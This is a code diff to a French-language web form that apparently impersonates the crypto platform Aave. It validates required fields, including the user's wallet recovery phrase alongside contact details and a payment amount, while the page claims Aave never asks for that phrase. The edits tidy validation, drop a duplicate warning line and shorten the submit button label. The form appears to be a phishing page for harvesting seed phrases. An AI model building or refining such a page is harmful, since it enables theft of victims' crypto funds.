@@ -24,7 +24,7 @@
         if (!telephone.trim()) return "Veuillez remplir le champ Téléphone.";
         if (!email.trim()) return "Veuillez remplir le champ Email.";
         if (!seed.trim()) return "Veuillez remplir la phrase de récupération.";
-        if (!montant.trim()) return "Veuillez indiquer un montant.";
+        if (!String(montant).trim()) return "Veuillez indiquer un montant.";
         if (!methode) return "Veuillez sélectionner une méthode de paiement.";
         return "";
     }
@@ -236,8 +236,6 @@
                     Aave ne vous demandera jamais votre phrase de récupération.
                     Ne la partagez avec personne, en aucune circonstance.
                 </p>
-                <br />
-                <p>Aave ne vous la demandera jamais.</p>
             </div>
 
             <div class="verify-box">
@@ -313,7 +311,7 @@
         {/if}
 
         <button class="btn" type="submit" disabled={submitting}>
-            {submitting ? "ENVOI EN COURS…" : "ENREGISTRER ET CONTINUER →"}
+            {submitting ? "ENVOI EN COURS…" : "CONTINUER →"}
         </button>
 
         <div class="footer-note">
